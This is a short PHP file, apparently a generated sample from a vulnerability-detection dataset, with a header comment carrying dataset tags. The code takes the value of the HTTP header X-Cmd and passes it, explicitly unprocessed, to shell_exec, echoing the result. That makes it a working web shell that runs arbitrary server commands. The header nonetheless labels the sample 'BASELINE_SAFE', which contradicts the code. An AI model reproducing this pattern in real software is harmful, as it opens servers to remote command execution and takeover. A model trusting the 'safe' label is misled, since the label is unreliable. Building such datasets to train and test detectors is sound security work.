<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_CHANGEKEYCASE; SKELETON=S2; KEY=cmd; SINK=B3; VAR=v0182; HDR_NAME=X-Cmd */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$h2 = array_change_key_case($h, CASE_LOWER);
$inp = (string)($h2["x-cmd"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B3($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
